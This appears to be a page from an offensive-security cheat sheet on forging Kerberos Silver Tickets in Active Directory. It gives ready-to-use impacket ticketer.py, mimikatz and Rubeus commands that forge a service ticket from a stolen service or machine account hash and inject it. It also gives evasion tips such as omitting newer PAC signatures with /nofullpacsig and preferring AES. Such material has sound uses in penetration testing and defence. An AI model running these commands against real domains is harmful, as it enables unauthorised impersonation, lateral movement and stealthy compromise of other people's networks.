**Silver Ticket** — forge a Kerberos Service Ticket (TGS) with a **service or computer account's** key. Unlike a [Golden Ticket](../Persistence/Golden%20Ticket.md) it never contacts the DC (no `krbtgt` needed) - the ticket is encrypted with the target service's own key - so it is stealthier but scoped to one service on one host.

## Discovery

Not applicable - you already need the target **service/computer account** NT hash or AES key, plus the domain SID and the SPN. Machine-account hashes come from [Dump Windows Registry (SAM-LSA)](../Credential%20Dumping/Dump%20Windows%20Registry%20%28SAM-LSA%29.md), [DCSync](../Credential%20Dumping/DCSync.md), or [Kerberoasting](Kerberoasting.md) for service accounts.

## Exploitation

Impersonate a user with local admin on the target for a useful SPN (`cifs/`, `host/`, `http/`, `mssqlsvc/`, `ldap/` on a DC).

### From Linux (impacket)

```bash

ticketer.py -nthash 'SERVICE_NT_HASH' -domain-sid 'DOMAIN_SID' -domain 'DOMAIN' -spn 'cifs/TARGET_FQDN' 'USER_NAME'
export KRB5CCNAME='USER_NAME.ccache'

```

### From Windows (mimikatz / Rubeus)

```powershell

# mimikatz (silver = golden with /target + /service)
kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_FQDN /service:cifs /rc4:SERVICE_NT_HASH /user:USER_NAME /ptt

# Rubeus
Rubeus.exe silver /service:cifs/TARGET_FQDN /rc4:SERVICE_NT_HASH /sid:DOMAIN_SID /user:USER_NAME /domain:DOMAIN /ptt /nowrap

```

Then use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- **Post-Nov-2021 patches:** the impersonated `USER_NAME` must be a **real** account, and DCs with PAC-signature enforcement may reject a forged PAC - Rubeus offers `/nofullpacsig` to omit the newer PAC signatures. Test against the target's patch level.
- A **machine account** hash used for a Silver Ticket to that same host overlaps with [Machine Account to Local Admin (S4U2self)](../Delegation%20Attacks/Computer%20Account%20to%20Local%20Admin.md) - S4U2self is stealthier (legitimate PAC, DC-issued) where you have the machine's TGT.
- Prefer AES (`-aesKey` / `/aes256`) over RC4.

## References

- The Hacker Recipes - Silver ticket - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
- ired.team - Silver tickets - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
- GhostPack Rubeus - https://github.com/GhostPack/Rubeus
